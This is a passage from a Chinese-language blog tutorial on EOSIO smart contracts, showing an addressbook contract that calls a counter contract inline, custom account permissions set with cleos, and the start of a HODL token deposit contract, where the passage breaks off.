class="keyword">using</span> count_index = eosio::multi_index&lt;<span class="string">"counts"</span>_n, counter&gt;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="创建合约账户"><a href="#创建合约账户" class="headerlink" title="创建合约账户"></a>创建合约账户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos create account eosio abcounter EOS8STYz9TYuEDHS1fErjgaDR1ApTk62eEaBzC7Jhn486paNrgsZC</span><br></pre></td></tr></table></figure><p>创建abcounter账户</p><h2 id="编译-部署-2"><a href="#编译-部署-2" class="headerlink" title="编译/部署"></a>编译/部署</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eosio-cpp abcounter.cpp -o abcounter.wasm</span><br><span class="line"></span><br><span class="line">cleos set contract abcounter &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;abcounter</span><br></pre></td></tr></table></figure><h2 id="修改addressbook合约"><a href="#修改addressbook合约" class="headerlink" title="修改addressbook合约"></a>修改addressbook合约</h2><p>这是为了通过修改addressbook合约来执行对外部合约的调用操作。</p><p>在private中创建一个合约声明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void increment_counter(name user, std::string type)&#123;</span><br><span class="line">abcounter::count_action count(&quot;abcounter&quot;_n, &#123;get_self(), &quot;active&quot;_n&#125;);</span><br><span class="line">count.send(user, type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用的是count_action动作包装器，初始化了count_action对象。</p><ul><li>第一个参数是合同名称abcounter</li><li>第二个参数是权限结构：get_self()是当前addressbook合约，使用active许可该合约。</li></ul><p>不需要额外指定action，因为动作包装前已经在定义action时合并了action。</p><p>接下来将increment_counter应用在每一个action。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Emplace</span><br><span class="line">increment_counter(user, &quot;emplace&quot;);</span><br><span class="line">&#x2F;&#x2F;Modify</span><br><span class="line">increment_counter(user, &quot;modify&quot;);</span><br><span class="line">&#x2F;&#x2F;Erase</span><br><span class="line">increment_counter(user, &quot;erase&quot;);</span><br></pre></td></tr></table></figure><h2 id="最终合约"><a href="#最终合约" class="headerlink" title="最终合约"></a>最终合约</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eosio/eosio.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"abcounter.cpp"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> eosio;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> [[<span class="title">eosio</span>:</span>:contract(<span class="string">"addressbook"</span>)]] addressbook : <span class="keyword">public</span> eosio::contract &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">  addressbook(name receiver, name code,  datastream&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt; ds): contract(receiver, code, ds) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  [[eosio::action]]</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">upsert</span><span class="params">(name user, <span class="built_in">std</span>::<span class="built_in">string</span> first_name, <span class="built_in">std</span>::<span class="built_in">string</span> last_name,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">uint64_t</span> age, <span class="built_in">std</span>::<span class="built_in">string</span> street, <span class="built_in">std</span>::<span class="built_in">string</span> city, <span class="built_in">std</span>::<span class="built_in">string</span> state)</span> </span>&#123;</span><br><span class="line">    require_auth(user);</span><br><span class="line">    <span class="function">address_index <span class="title">addresses</span><span class="params">(get_first_receiver(), get_first_receiver().value)</span></span>;</span><br><span class="line">    <span class="keyword">auto</span> iterator = addresses.find(user.value);</span><br><span class="line">    <span class="keyword">if</span>( iterator == addresses.end() )</span><br><span class="line">    &#123;</span><br><span class="line">      addresses.emplace(user, [&amp;]( <span class="keyword">auto</span>&amp; row ) &#123;</span><br><span class="line">       row.key = user;</span><br><span class="line">       row.first_name = first_name;</span><br><span class="line">       row.last_name = last_name;</span><br><span class="line">       row.age = age;</span><br><span class="line">       row.street = street;</span><br><span class="line">       row.city = city;</span><br><span class="line">       row.state = state;</span><br><span class="line">      &#125;);</span><br><span class="line">      send_summary(user, <span class="string">" successfully emplaced record to addressbook"</span>);</span><br><span class="line">      increment_counter(user, <span class="string">"emplace"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span> changes;</span><br><span class="line">      addresses.modify(iterator, user, [&amp;]( <span class="keyword">auto</span>&amp; row ) &#123;</span><br><span class="line">        row.key = user;</span><br><span class="line">        row.first_name = first_name;</span><br><span class="line">        row.last_name = last_name;</span><br><span class="line">        row.age = age;</span><br><span class="line">        row.street = street;</span><br><span class="line">        row.city = city;</span><br><span class="line">        row.state = state;</span><br><span class="line">      &#125;);</span><br><span class="line">      send_summary(user, <span class="string">" successfully modified record to addressbook"</span>);</span><br><span class="line">      increment_counter(user, <span class="string">"modify"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  [[eosio::action]]</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">(name user)</span> </span>&#123;</span><br><span class="line">    require_auth(user);</span><br><span class="line"></span><br><span class="line">    <span class="function">address_index <span class="title">addresses</span><span class="params">(get_first_receiver(), get_first_receiver().value)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> iterator = addresses.find(user.value);</span><br><span class="line">    check(iterator != addresses.end(), <span class="string">"Record does not exist"</span>);</span><br><span class="line">    addresses.erase(iterator);</span><br><span class="line">    send_summary(user, <span class="string">" successfully erased record from addressbook"</span>);</span><br><span class="line">    increment_counter(user, <span class="string">"erase"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  [[eosio::action]]</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">notify</span><span class="params">(name user, <span class="built_in">std</span>::<span class="built_in">string</span> msg)</span> </span>&#123;</span><br><span class="line">    require_auth(get_self());</span><br><span class="line">    require_recipient(user);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> [[<span class="title">eosio</span>:</span>:table]] person &#123;</span><br><span class="line">    name key;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> first_name;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> last_name;</span><br><span class="line">    <span class="keyword">uint64_t</span> age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> street;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> city;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> state;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> primary_key() <span class="keyword">const</span> &#123; <span class="keyword">return</span> key.value; &#125;</span><br><span class="line">    <span class="keyword">uint64_t</span> get_secondary_1() <span class="keyword">const</span> &#123; <span class="keyword">return</span> age;&#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">send_summary</span><span class="params">(name user, <span class="built_in">std</span>::<span class="built_in">string</span> message)</span> </span>&#123;</span><br><span class="line">    action(</span><br><span class="line">      permission_level&#123;get_self(),<span class="string">"active"</span>_n&#125;,</span><br><span class="line">      get_self(),</span><br><span class="line">      <span class="string">"notify"</span>_n,</span><br><span class="line">      <span class="built_in">std</span>::make_tuple(user, name&#123;user&#125;.to_string() + message)</span><br><span class="line">    ).send();</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">increment_counter</span><span class="params">(name user, <span class="built_in">std</span>::<span class="built_in">string</span> type)</span> </span>&#123;</span><br><span class="line">    abcounter::<span class="function">count_action <span class="title">count</span><span class="params">(<span class="string">"abcounter"</span>_n, &#123;get_self(), <span class="string">"active"</span>_n&#125;)</span></span>;</span><br><span class="line">    count.send(user, type);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">typedef</span> eosio::multi_index&lt;<span class="string">"people"</span>_n, person,</span><br><span class="line">    indexed_by&lt;<span class="string">"byage"</span>_n, const_mem_fun&lt;person, <span class="keyword">uint64_t</span>, &amp;person::get_secondary_1&gt;&gt;</span><br><span class="line">  &gt; address_index;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="重新编译-部署"><a href="#重新编译-部署" class="headerlink" title="重新编译/部署"></a>重新编译/部署</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eosio-cpp -o addressbook.wasm addressbook.cpp -I ..&#x2F;abcounter&#x2F;</span><br><span class="line"></span><br><span class="line">cleos set contract addressbook &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;addressbook</span><br></pre></td></tr></table></figure><h2 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h2><p>alice账户都出错了。。因此之后都是替换成addressbook账户才行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action addressbook upsert '["addressbook", "alice", "liddell", 19, "123 drink me way", "wonderland", "amsterdam"]' -p addressbook@active</span><br></pre></td></tr></table></figure><p>可以看到计数器已经成功通知。接着检查表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos get table abcounter abcounter counts --lower addressbook --limit 1</span><br></pre></td></tr></table></figure><p>测试每个action并检查计数器。</p><p>upsert修改记录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action addressbook upsert '["addressbook", "alice", "liddell", 21,"1 there we go", "wonderland", "amsterdam"]' -p addressbook@active</span><br></pre></td></tr></table></figure><p>erase删除记录（这个又出错了）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action addressbook erase '["addressbook"]' -p addressbook@active</span><br></pre></td></tr></table></figure><p>直接调用abcounter合约来操纵数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action abcounter count '["addressbook", "erase"]' -p addressbook@active</span><br></pre></td></tr></table></figure><h2 id="增加更多信息"><a href="#增加更多信息" class="headerlink" title="增加更多信息"></a>增加更多信息</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eosio/eosio.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"abcounter.cpp"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> eosio;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> [[<span class="title">eosio</span>:</span>:contract(<span class="string">"addressbook"</span>)]] addressbook : <span class="keyword">public</span> eosio::contract &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">  addressbook(name receiver, name code,  datastream&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt; ds): contract(receiver, code, ds) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  [[eosio::action]]</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">upsert</span><span class="params">(name user, <span class="built_in">std</span>::<span class="built_in">string</span> first_name, <span class="built_in">std</span>::<span class="built_in">string</span> last_name, <span class="keyword">uint64_t</span> age, <span class="built_in">std</span>::<span class="built_in">string</span> street, <span class="built_in">std</span>::<span class="built_in">string</span> city, <span class="built_in">std</span>::<span class="built_in">string</span> state)</span> </span>&#123;</span><br><span class="line">    require_auth(user);</span><br><span class="line"></span><br><span class="line">    <span class="function">address_index <span class="title">addresses</span><span class="params">(get_first_receiver(), get_first_receiver().value)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> iterator = addresses.find(user.value);</span><br><span class="line">    <span class="keyword">if</span>( iterator == addresses.end() )</span><br><span class="line">    &#123;</span><br><span class="line">      addresses.emplace(user, [&amp;]( <span class="keyword">auto</span>&amp; row )&#123;</span><br><span class="line">       row.key = user;</span><br><span class="line">       row.first_name = first_name;</span><br><span class="line">       row.last_name = last_name;</span><br><span class="line">       row.age = age;</span><br><span class="line">       row.street = street;</span><br><span class="line">       row.city = city;</span><br><span class="line">       row.state = state;</span><br><span class="line">       send_summary(user, <span class="string">" successfully emplaced record to addressbook"</span>);</span><br><span class="line">       increment_counter(user, <span class="string">"emplace"</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span> changes;</span><br><span class="line">      addresses.modify(iterator, user, [&amp;]( <span class="keyword">auto</span>&amp; row ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(row.first_name != first_name) &#123;</span><br><span class="line">          row.first_name = first_name;</span><br><span class="line">          changes += <span class="string">"first name "</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(row.last_name != last_name) &#123;</span><br><span class="line">          row.last_name = last_name;</span><br><span class="line">          changes += <span class="string">"last name "</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(row.age != age) &#123;</span><br><span class="line">          row.age = age;</span><br><span class="line">          changes += <span class="string">"age "</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(row.street != street) &#123;</span><br><span class="line">          row.street = street;</span><br><span class="line">          changes += <span class="string">"street "</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(row.city != city) &#123;</span><br><span class="line">          row.city = city;</span><br><span class="line">          changes += <span class="string">"city "</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(row.state != state) &#123;</span><br><span class="line">          row.state = state;</span><br><span class="line">          changes += <span class="string">"state "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!changes.empty()) &#123;</span><br><span class="line">        send_summary(user, <span class="string">" successfully modified record in addressbook. Fields changed: "</span> + changes);</span><br><span class="line">        increment_counter(user, <span class="string">"modify"</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        send_summary(user, <span class="string">" called upsert, but request resulted in no changes."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  [[eosio::action]]</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">(name user)</span> </span>&#123;</span><br><span class="line">    require_auth(user);</span><br><span class="line">    <span class="function">address_index <span class="title">addresses</span><span class="params">(get_first_receiver(), get_first_receiver().value)</span></span>;</span><br><span class="line">    <span class="keyword">auto</span> iterator = addresses.find(user.value);</span><br><span class="line">    check(iterator != addresses.end(), <span class="string">"Record does not exist"</span>);</span><br><span class="line">    addresses.erase(iterator);</span><br><span class="line">    send_summary(user, <span class="string">" successfully erased record from addressbook"</span>);</span><br><span class="line">    increment_counter(user, <span class="string">"erase"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  [[eosio::action]]</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">notify</span><span class="params">(name user, <span class="built_in">std</span>::<span class="built_in">string</span> msg)</span> </span>&#123;</span><br><span class="line">    require_auth(get_self());</span><br><span class="line">    require_recipient(user);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> [[<span class="title">eosio</span>:</span>:table]] person &#123;</span><br><span class="line">    name key;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> first_name;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> last_name;</span><br><span class="line">    <span class="keyword">uint64_t</span> age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> street;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> city;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> state;</span><br><span class="line">    <span class="keyword">uint64_t</span> primary_key() <span class="keyword">const</span> &#123; <span class="keyword">return</span> key.value; &#125;</span><br><span class="line">    <span class="keyword">uint64_t</span> get_secondary_1() <span class="keyword">const</span> &#123; <span class="keyword">return</span> age;&#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">send_summary</span><span class="params">(name user, <span class="built_in">std</span>::<span class="built_in">string</span> message)</span> </span>&#123;</span><br><span class="line">    action(</span><br><span class="line">      permission_level&#123;get_self(),<span class="string">"active"</span>_n&#125;,</span><br><span class="line">      get_self(),</span><br><span class="line">      <span class="string">"notify"</span>_n,</span><br><span class="line">      <span class="built_in">std</span>::make_tuple(user, name&#123;user&#125;.to_string() + message)</span><br><span class="line">    ).send();</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">increment_counter</span><span class="params">(name user, <span class="built_in">std</span>::<span class="built_in">string</span> type)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    action counter = action(</span><br><span class="line">      permission_level&#123;get_self(),<span class="string">"active"</span>_n&#125;,</span><br><span class="line">      <span class="string">"abcounter"</span>_n,</span><br><span class="line">      <span class="string">"count"</span>_n,</span><br><span class="line">      <span class="built_in">std</span>::make_tuple(user, type)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    counter.send();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">typedef</span> eosio::multi_index&lt;<span class="string">"people"</span>_n, person, indexed_by&lt;<span class="string">"byage"</span>_n, const_mem_fun&lt;person, <span class="keyword">uint64_t</span>, &amp;person::get_secondary_1&gt;&gt;&gt; address_index;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="创建和使用自定义账户权限"><a href="#创建和使用自定义账户权限" class="headerlink" title="创建和使用自定义账户权限"></a>创建和使用自定义账户权限</h1><p>首先需要拥有一个父权限，才能自定义权限，从而控制合约的某些操作。</p><h2 id="创建自定义权限"><a href="#创建自定义权限" class="headerlink" title="创建自定义权限"></a>创建自定义权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos set account permission addressbook upsert EOS8STYz9TYuEDHS1fErjgaDR1ApTk62eEaBzC7Jhn486paNrgsZC owner -p addressbook@owner</span><br></pre></td></tr></table></figure><ol><li>创建名为upsert的新权限。</li><li>该upsert权限使用开发公钥作为许可。</li><li>它建立在alice账户上。</li></ol><h2 id="将合约action授权链接到自定义权限"><a href="#将合约action授权链接到自定义权限" class="headerlink" title="将合约action授权链接到自定义权限"></a>将合约action授权链接到自定义权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos set action permission addressbook addressbook upsert upsert</span><br></pre></td></tr></table></figure><p>授权upsert权限链接到addressbook合约的upsert操作。</p><h2 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h2><p>在alice的权限下调用upsert:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action addressbook upsert &#39;[&quot;addressbook&quot;, &quot;alice&quot;, &quot;liddel&quot;, 21, &quot;Herengracht&quot;, &quot;land&quot;, &quot;dam&quot;]&#39; -p addressbook@active</span><br></pre></td></tr></table></figure><p>会发现报错了。使用upsert权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action addressbook upsert &#39;[&quot;addressbook&quot;, &quot;alice&quot;, &quot;liddel&quot;, 21, &quot;Herengracht&quot;, &quot;land&quot;, &quot;dam&quot;]&#39; -p addressbook@upsert</span><br></pre></td></tr></table></figure><p>正常执行。</p><h1 id="支付action"><a href="#支付action" class="headerlink" title="支付action"></a>支付action</h1><p>在将token转移时触发的支付操作。</p><h2 id="创建HODL代币"><a href="#创建HODL代币" class="headerlink" title="创建HODL代币"></a>创建HODL代币</h2><p>创建一个hodl类，继承了eosio::contract</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;eosiolib&#x2F;eosio.hpp&gt;</span><br><span class="line">using namespace eosio;</span><br><span class="line"></span><br><span class="line">class [[eosio::contract(&quot;hodl&quot;)]] hodl:public eosio::contract&#123;</span><br><span class="line">private:</span><br><span class="line">static const uint32_t the_party &#x3D; 1645525342;&#x2F;&#x2F;将hodl设置为在2022-2-22的晚10:22:22结束</span><br><span class="line">const symbol hodl_symbol;&#x2F;&#x2F;定义一个token符号，即SYS</span><br><span class="line">public:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后定义一个balance表来跟踪合约收到的token数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct [[eosio::table]] balance&#123;</span><br><span class="line">eosio::asset funds;</span><br><span class="line">uint64_t primary_key() const&#123;return funds.symbol.raw();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用了一个新的asset类型，表示数字token资产的类型。symbol资产实例的成员用作主键，通过调用raw()函数，将symbol变量转换为无符号整数。</p><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>将hodl_symbol初始化为SYS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public:</span><br><span class="line">using contract::contract;</span><br><span class="line">hodl(name receiver, name code, datastream&lt;const char*&gt;ds):contract(receiver, code, ds), hodl_symbol(&quot;SYS&quot;, 4)&#123;&#125;</span><br></pre></td></tr></table></figure><p>创建一个函数来访问当前UTC时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uint32_t now()&#123;</span><br><span class="line">return current_time_point().sec_since_epoch();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写存款action"><a href="#编写存款action" class="headerlink" title="编写存款action"></a>编写存款action</h2><p>要接受转账，需要进行存款操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[[eosio::on_notify(&quot;eosio.token::transfer&quot;)]]</span><br><span class="line">void deposit(name 